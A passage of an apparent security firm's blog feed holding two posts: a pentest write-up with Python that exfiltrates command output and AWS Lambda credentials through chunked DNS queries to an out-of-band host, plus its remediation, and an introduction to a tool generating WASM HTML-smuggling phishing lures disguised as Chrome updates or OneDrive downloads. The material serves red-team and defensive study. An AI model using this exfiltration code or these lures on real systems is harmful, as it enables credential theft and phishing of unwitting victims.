&lt;h4&gt;Chunks &amp;amp; Ordering&lt;span class=&#34;absolute -mt-20&#34; id=&#34;chunks--ordering&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#chunks--ordering&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;When I first learnt about how TCP worked, it fascinated me with the inner mechanisms of stateful sessions, message ordering, length and integrity checks, and so on. Basically the protocol involves chopping the sender&amp;rsquo;s message into little chunks, and the receiver can receive them in any order, recombine the chunks, and get back the original message, with a check that a) the message is intact and, b) the message has ended. How brilliant!&lt;/p&gt;
&lt;p&gt;Now that I am about to chop my bootleg DNS messages into 60-odd byte chunks, the minimum that I need to implement is a system which gives a little index tag to the message, and when I get back the messages in any order, my decoder will be able to rearrange them, combine back the original message, and decode them as one.&lt;/p&gt;
&lt;p&gt;Below is how I implemented it (with a little bit of help from our friend ChatGPT…) - if the payload is less than 60 bytes long, we define that the number of segments is 0. Otherwise, it will just be the result of the length of the payload divided by 60 (e.g. for 80 byte payload, the number of segments is 2). We loop through the segments, cutting out &lt;code&gt;60*(n) to 60*(n+1) th&lt;/code&gt; bytes, and finally add the index label before the payload in the final DNS query:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    data = popen(&amp;#39;ls /usr/bin&amp;#39;).read().encode(&amp;#39;UTF-8&amp;#39;) 
    payload = b64encode(data).decode(&amp;#39;utf-8&amp;#39;).replace(&amp;#39;=&amp;#39;,&amp;#39;&amp;#39;)

    if len(payload) % 60 == 0:
        num_segments = 0
    else:
        num_segments = (len(payload) // 60) &amp;#43; 1 

    for i in range(num_segments):
        start_index = i * 60
        end_index = start_index &amp;#43; 60
        segment = payload[start_index:end_index]
        url = f&amp;#39;{i}.{segment}..subdomain.awesome-blogpost.com&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And the glorious moment of seeing the results back:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;    _       __                       __       __  
   (_)___  / /____  _________ ______/ /______/ /_ 
  / / __ \/ __/ _ \/ ___/ __ &amp;#39;/ ___/ __/ ___/ __ \
 / / / / / /_/  __/ /  / /_/ / /__/ /_(__  ) / / /
/_/_/ /_/\__/\___/_/   \__,_/\___/\__/____/_/ /_/

        projectdiscovery.io
[INF] Listing 1 payload for OOB Testing
[INF] .subdomain.awesome-blogpost.com

[0.WwphbGlhcwphcmNoCmF3awpiMnN1bQpiYXNlMzIKYmFzZTY0CmJhc2VuYW1l.] Received DNS interaction (A) from 3.9.x.x at ...
[1.CmJhc2VuYwpiYXNoCmJhc2hidWcKYmFzaGJ1Zy02NApiZwpjYS1sZWdhY3kK.] Received DNS interaction (A) from 3.9.x.x at ...
[2.Y2F0CmNhdGNoc2VndgpjZApjaGNvbgpjaGdycApjaG1vZApjaG93bgpja3N1.] Received DNS interaction (A) from 35.177.x.x at ...
[3.bQpjb21tCmNvbW1hbmQKY29yZXV0aWxzCmNwCmNzcGxpdApjdXJsCmN1dApk.] Received DNS interaction (A) from 18.134.x.x at ...
[4.YXRlCmRkCmRmCmRpcgpkaXJjb2xvcnMKZGlybmFtZQpkbmYKZHUKZWNobwpl.] Received DNS interaction (A) from 35.177.x.x at ...
[5.Z3JlcAplbnYKZXhwYW5kCmV4cHIKZmFjdG9yCmZhbHNlCmZjCmZnCmZncmVw.] Received DNS interaction (A) from 35.177.x.x at ...
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Mouse over and copy the output, run it through a oneliner to remove the extra stuff, sort it, remove the duplicates, and decode the whole thing:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;$ xclip -o clip | cut -d &amp;#39; &amp;#39; -f 1 | sed &amp;#39;s/\[//;s/\.\]//&amp;#39; | sort -h | uniq &amp;gt; output26; python3 decode2.py output26
Decoded string: 

alias
arch
awk
...
ls
md5sum
microdnf
mkdir
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;Look at me, I am the Lambda now&lt;span class=&#34;absolute -mt-20&#34; id=&#34;look-at-me-i-am-the-lambda-now&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#look-at-me-i-am-the-lambda-now&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Now we are cooking! That&amp;rsquo;s basically a semi-interactive shell (with a couple of extra steps). Each command we want to run we put it in the popen(), invoke the app&amp;rsquo;s feature, get back results from Interactsh, and decode in Python. I&amp;rsquo;ll skip the enumeration bit and jump straight to the post-exploitation. Knowing that we are inside of an AWS Lambda, there are quite a few angles to tackle and exploit this. For more information specific to Lambda exploitation, refer to &lt;a href=&#34;https://hackingthe.cloud/aws/post_exploitation/lambda_persistence/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hacktricks&amp;rsquo; articles on this&lt;/a&gt;. Sadly the pentest timeline was approaching its end and I felt the need to go for the highest impact finding as soon as possible, instead of exploring with a leisurely pace. Having a way to get data out and run commands, we could read environmental variables to extract the AWS secret &amp;amp; access keys of the application. With AWS credentials you can impersonate the application&amp;rsquo;s identity and access (supposedly) whatever the app could access inside of the AWS tenant.&lt;/p&gt;
&lt;p&gt;This was the first method I demonstrated, showing how the &amp;ldquo;AWS_ACCESS_KEY_ID&amp;rdquo; was extracted with os.envrion.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic14.png&#34; title=&#34;pic14&#34; alt=&#34;pic14&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic14&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The second method, reading the environmental vars from &lt;code&gt;/proc/self/environ&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic15.png&#34; title=&#34;pic15&#34; alt=&#34;pic15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To authenticate to AWS with these credentials on the cli, you first put the keys extracted into a profile in your &lt;code&gt;~/.aws/credentials&lt;/code&gt; file like this:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic16.png&#34; title=&#34;pic16&#34; alt=&#34;pic16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Running &lt;code&gt;sts get-caller-identity&lt;/code&gt;, the &lt;code&gt;whoami&lt;/code&gt; for aws cli, we can see that the authentication as the lambda was successful.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic17.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda&amp;rsquo;s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn&amp;rsquo;t much. There were some other attack vectors pertaining the Lambda angle, such as the &lt;code&gt;/invocation/next&lt;/code&gt; endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic18.png&#34; title=&#34;pic18&#34; alt=&#34;pic18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Epilogue - Investigations on AWS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;epilogue---investigations-on-aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#epilogue---investigations-on-aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly &amp;ldquo;blocked everything&amp;rdquo;. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an &amp;ldquo;air gapped&amp;rdquo; cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).&lt;/p&gt;
&lt;p&gt;After delivering the report I couldn&amp;rsquo;t stop thinking about this remediation bit because:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;I thought it should be possible to configure that capacity, but I&amp;rsquo;m not 100% sure how to. So if I deployed a Lambda myself, I wasn&amp;rsquo;t sure yet how it should be secured against this attack (besides not having an RCE, phew!).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Or … what if there wasn&amp;rsquo;t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?&lt;/p&gt;
&lt;p&gt;I searched around for a bit for strings like &amp;ldquo;DNS Firewall&amp;rdquo; within AWS and on Google. Soon I found this: &amp;ldquo;Route 53 Resolver DNS Firewall&amp;rdquo;, a billable service … that blocks port 53 after you have blocked port 53. I was like &amp;ldquo;of course Jeff, I knew you&amp;rsquo;d do this to us…&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic19.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic20.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it&amp;rsquo;s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.&lt;/p&gt;
&lt;p&gt;I hope you&amp;rsquo;ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you&amp;rsquo;d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.&lt;/p&gt;
&lt;p&gt;The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we&amp;rsquo;re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>WASM Smuggling for Initial Access and W.A.L.K. Tool Release</title>
      <link>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</link>
      <pubDate>Fri, 31 May 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/05/2024-05-31-wasm-smuggling-for-initial-access-and-w-a-l-k-tool-release/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;&lt;em&gt;&lt;figure&gt;
    &lt;img src=&#34;images/8salmg-ezgif.com-crop.gif&#34; title=&#34;8salmg ezgif.com crop&#34; alt=&#34;8salmg ezgif.com crop&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;8salmg ezgif.com crop&lt;/figcaption&gt;
  &lt;/figure&gt;TL;DR&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This blog post introduces Web Assembly (WASM) as a powerful alternative to traditional web technologies, highlighting its appeal to cybersecurity professionals for evading security measures for initial access. WASM has been observed being leveraged in the wild as a new payload delivery avenue which can land payloads in a hardened email inbox or instant messaging chats. A new tool, W.A.L.K. (Web Assembly Lure Krafter), is released alongside this blogpost to automate the generation of payloads using Rust, bringing back HTML smuggling attacks and enhancing red teamers tradecraft.&lt;/p&gt;
&lt;h1&gt;Introduction&lt;/h1&gt;&lt;p&gt;Everyone is aware that the internet is powered by a plethora of platforms, services and technologies, but all the web content we see nowadays were fundamentally built using HTML, CSS and JavaScript. This has been the holy trinity of the web that allowed creative developers to build an amount of sites and content on the internet that cannot possibly be explored in the span of a lifetime, at least not in a non-automated fashion (and I guess I’m including the dark web too there).&lt;/p&gt;
&lt;p&gt;At the same time not everyone is aware that a different way of building web pages has been available to developers and browsers for almost a decade, and this is called Web Assembly.&lt;/p&gt;
&lt;p&gt;Web Assembly (also known as WASM) was released to the public for the first time in 2017. It has allowed internet wizards and obscure developers alike to simulate operating systems or play Doom (&lt;a href=&#34;https://wasm.continuation-labs.com/d3demo/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Doom 3 Demo&lt;/a&gt;) from within browsers (yes, it can play Doom!), opening the world wide web to a new way of building content that was once only reserved for compiled programming languages.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WASM_Win2000.png&#34; title=&#34;WASM Win2000&#34; alt=&#34;WASM Win2000&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WASM Win2000&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Windows 2000 rendered in browser using Web Assembly (&lt;a href=&#34;https://bellard.org/jslinux/vm.html?url=https://bellard.org/jslinux/win2k.cfg&amp;amp;mem=192&amp;amp;graphic=1&amp;amp;w=1024&amp;amp;h=768&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;view&lt;/a&gt;). More projects can be found on &lt;a href=&#34;https://madewithwebassembly.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;madewithwebassembly&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;What is WASM?&lt;/h1&gt;&lt;p&gt;WASM’s origins can be traced back to asm.js, a subset of JavaScript designed to facilitate the deployment of C and other demanding applications within web browsers. Recognising its potential, it was W3C that spearheaded it&amp;rsquo;s evolution into the open standard now known as Web Assembly. Web Assembly’s strengths lay in its core promise of speed and performance, far outpacing traditional JavaScript. It allows browsers to perform intensive computations with efficiency and stability, avoiding many of the pitfalls of JavaScript&amp;rsquo;s limitations.&lt;/p&gt;
&lt;p&gt;It operates in two primary formats: a compact binary format for the browser&amp;rsquo;s Virtual Machine (VM) and an assembly-like textual format. While earlier technologies like Adobe’s Flash struggled with this, Web Assembly stands out, although it still remains under scrutiny for &lt;a href=&#34;https://www.youtube.com/watch?v=QWsSNRQN7v8&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;potential vulnerabilities&lt;/a&gt;. Importantly though, Web Assembly supports the seamless execution of code from multiple languages such as C, C++, Rust, and Go.&lt;/p&gt;
&lt;h1&gt;Why is WASM interesting to cybersecurity folks?&lt;/h1&gt;&lt;p&gt;You probably guessed it by now! As it is a lesser known alternative to build web content, it is also more interesting for threat actors that want to circumvent classic email filters and their security controls.&lt;/p&gt;
&lt;p&gt;From the red teaming perspective WASM presents features that can introduce malicious capabilities such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Run malicious content within browsers.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Evade traditional known-malicious JavaScript functions, like window.local.href (a property in JavaScript that gets or sets the URL of the current window, usually used to redirect the browser to a different URL) and window.navigator.msSaveOrOpenElob (typically used to download files from a web application, it allows for the saving or opening of a blob).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bypass detection mechanisms typical of conventional file type signatures.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Consider all of the mechanisms that browsers, web service providers, operating systems and security companies have developed and implemented over the years to identify, detect and alert against suspicious web pages that try to execute malicious code. Such defences have been mostly adapted to the malicious JavaScript and HTML tags that can be contained in a web page. So, what happens when instead we use Web Assembly to build a web page? We observe security controls becoming nearly non-existent when attempting to determine whether the web page is nefarious or legitimate.&lt;/p&gt;
&lt;p&gt;Combine WASM with techniques such as payload smuggling and you get a modern and stealthy initial access tactic that gets past modern email and instant messaging defences allowing your initial access to land in your target’s inbox unhindered!&lt;/p&gt;
&lt;p&gt;When I read about this I was way too excited not to dive into this evolved way of smuggling payloads and therefore, if you haven’t before, I’m honoured to introduce you to WASM smuggling and the tool I have built to automate payload generation.&lt;/p&gt;
&lt;h1&gt;Smuggling Payloads using W.A.L.K.&lt;/h1&gt;&lt;p&gt;I was never a proficient developer (even more so for languages such as C or Rust) so I asked for some help from my favourite AI companion to better understand the concepts behind WASM smuggling. I started from this amazing article from &lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;deliver.to&lt;/a&gt; and managed to create a few web lures leveraging Rust, which inevitably led me to wanting to build a tool to automate the process. The above deliver.to’s article describes how attackers have been using Rust to recreate classic HTML smuggling techniques that get past the craziest email controls. Bonus - it also gives some nice templates coded in Rust!&lt;/p&gt;
&lt;p&gt;On top of this, a &lt;a href=&#34;https://www.crowdstrike.com/blog/ecriminals-increasingly-use-webassembly-to-hide-malware/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CrowdStrike article&lt;/a&gt; also described how threat actors have been using this technique for a few years now (the article is from 2021) and together with NetSPI’s blog post on &lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SilkWASM&lt;/a&gt; I felt like I had enough examples to start building towards executing this tactic and going through the process needed to generate lures to be weaponised for initial access.&lt;/p&gt;
&lt;p&gt;At this point, we know that this technique is actively being used by malicious actors, it can circumvent traditional mail security controls and can be combined with obsolete and disused HTML smuggling techniques to perform older attacks in a modern fashion. Although bringing back Beef hooks may sound exciting, these were not very effective against modern browser sandboxing features. Yet attacks such as &lt;a href=&#34;https://blog.delivr.to/html-smuggling-recent-observations-of-threat-actor-techniques-74501d5c8a06&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;SVG Smuggling&lt;/a&gt; could be fruitful when built using WASM.&lt;/p&gt;
&lt;p&gt;The process of creating a standalone WASM smuggling lure is somewhat tortuous if you are not a proficient Rust developer and I will purposefully skip the part where I tell you how to manually set one up. There is enough information on the internet to understand and guide you through this process. Nonetheless, allow me to introduce you to my new tool W.A.L.K. (Web Assembly Lure Krafter) which I developed to ease the above-mentioned process of building a standalone WASM payload smuggling lure.&lt;/p&gt;
&lt;p&gt;The lure generated by the tool is based on prebuilt lure templates coded in Rust. It embeds payloads to smuggle through in a single HTML file which can then be sent in either instant messaging chats or via email attachments.&lt;/p&gt;
&lt;p&gt;W.A.L.K. can be found at the following Github repository:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Follow through the repo’s README to set up your Rust environment and the relevant WASM libraries. Once done, navigate to the project’s root folder and simply run the tool from the command line using cargo run.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WALK_menu.png&#34; title=&#34;WALK menu&#34; alt=&#34;WALK menu&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WALK menu&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;This will start W.A.L.K., presenting a menu with 3 lure templates to select from. The selection will be used to generate a template that embeds a custom payload and delivers it differently based on the lure selected.&lt;/p&gt;
&lt;p&gt;The “Google Chrome Update” lure was designed to simulate a Google Chrome binary download motivated by a pretext such as “I.T. wants you to upgrade your version of Chrome”. The download button will trigger the download of the payload you embedded during the generation through W.A.L.K.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/NoPlaceLikeChrome.png&#34; title=&#34;NoPlaceLikeChrome&#34; alt=&#34;NoPlaceLikeChrome&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;NoPlaceLikeChrome&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The “One Drive File Download” template instead uses a lure based on the looks of Microsoft OneDrive. The lure generated off this template will trigger a file download 4 seconds after rendering the web page, simulating the delivery of files via a shareable OneDrive link.&lt;/p&gt;
&lt;p&gt;As an example, this can be used with the pretext of wanting to provide HR (or a recruiter) with your resume and perhaps smuggle a payload through with it.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WelcomeToOneDrive.png&#34; title=&#34;WelcomeToOneDrive&#34; alt=&#34;WelcomeToOneDrive&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WelcomeToOneDrive&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the lure is selected, the program will guide through all the other options and values needed to build the HTML smuggling payload in Web Assembly. For example, the program will ask for the file extension to utilise for the downloaded payload, its location on the file system for the payload to be embedded as well as the file name shown for the file when downloading the payload.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/WALK_output.png&#34; title=&#34;WALK output&#34; alt=&#34;WALK output&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;WALK output&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Once the lure is compiled, W.A.L.K. will show the relative file path of the generated lure. The file to smuggle consists of a standalone “index.html” file contained in the results folder of the project. Such index.html files can then be uploaded and sent via email or chat, effectively allowing your payload to be transported and smuggled through.&lt;/p&gt;
&lt;p&gt;The above-mentioned lures, wrapped in a single HTML file, have been observed successfully landing in hardened corporate email inboxes, surprisingly circumventing any active controls that we are used to experiencing when dealing with email and instant messaging chats (e.g. spam filtering/classification, file AV scans), even when the message comes from standard non-corporate inboxes that present TLDs such as gmail.com, outlook.com, live.com, etc..&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/RevieMyFiles.png&#34; title=&#34;RevieMyFiles&#34; alt=&#34;RevieMyFiles&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;RevieMyFiles&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The figure shows how the index.html file can be embedded into the email body to look more legitimate.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/OneDriveIsAGo.png&#34; title=&#34;OneDriveIsAGo&#34; alt=&#34;OneDriveIsAGo&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;OneDriveIsAGo&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;For example, in this case both the email provider and OneDrive malware scans did not pick up the malicious contents of the file (called myFiles.html) and allowed the Download to happen from their platform.&lt;/p&gt;
&lt;p&gt;The index.html file can then be sent in various ways and linked to your messages using a number of methods that may allow more or less number of clicks before the victim executes the contents of the smuggled payload. The reader is left with the arduous task of determining the best way to convey their smuggling lure to their victims and how many clicks their targets will need to go through before execution.&lt;/p&gt;
&lt;p&gt;Although not properly documented as of now, W.A.L.K. was designed for modularity. This means that it is possible to create more lure templates to expand the menu selection and allow new templates to be utilised with the tool. Despite not being documented yet, these capabilities are there and anyone interested can dive into the code in the repository to leverage this feature. There will eventually be a follow up blog post explaining how to create new Web Assembly lures in Rust and how to make them so that they can be used to expand W.A.L.K.&amp;rsquo;s lurebase.&lt;/p&gt;
&lt;h1&gt;Conclusions&lt;/h1&gt;&lt;p&gt;Although attacker-centric, this blogpost is intended to be a heads up for detection and response practitioners, but also to any defensive security researchers who feel the urge to dive into the intricacies of such a technique after reading this blog post.&lt;/p&gt;
&lt;p&gt;Current security controls do not yet seem capable of determining the IoCs and the heuristics involved, and so we are in need of additional detection and prevention mechanisms that can reduce the risk of malicious web assembly attacks.&lt;/p&gt;
&lt;p&gt;I really hope you enjoyed this article and will find my tool useful for your future red team engagements or to develop better defences and controls.&lt;/p&gt;
&lt;p&gt;So long, and wish you the best of fun in your hacking journeys!&lt;/p&gt;
&lt;h1&gt;Credit&lt;/h1&gt;&lt;p&gt;Credit where credit is due. This section is dedicated to give a big shout out to NetSPI for the initial research done into weaponising WASM for initial access as described in their article, linked here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical-blog/adversary-simulation/obfuscating-html-smuggling-with-web-assembly/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;The Silk Wasm: Obfuscating HTML Smuggling with Web Assembly&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And another thank you to the researchers at delivr.to who have released an amazing  research on how to build your WASM lure using Rust, which was used as a starting point for W.A.L.K. and really helped me understand this technique. You can find their research here:&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.delivr.to/webassembly-smuggling-it-wasmt-me-648a62547ff4&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;WebAssembly Smuggling: It WASM’t me&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;Resources:&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Link to W.A.L.K. (JUMPSEC Github):
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/JumpsecLabs/WALK_WebAssembly_Lure_Krafter&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Github - W.A.L.K. Web Assembly Lure Krafter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;HTML Smuggling
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Web Assembly Smuggling Research
&lt;ul&gt;
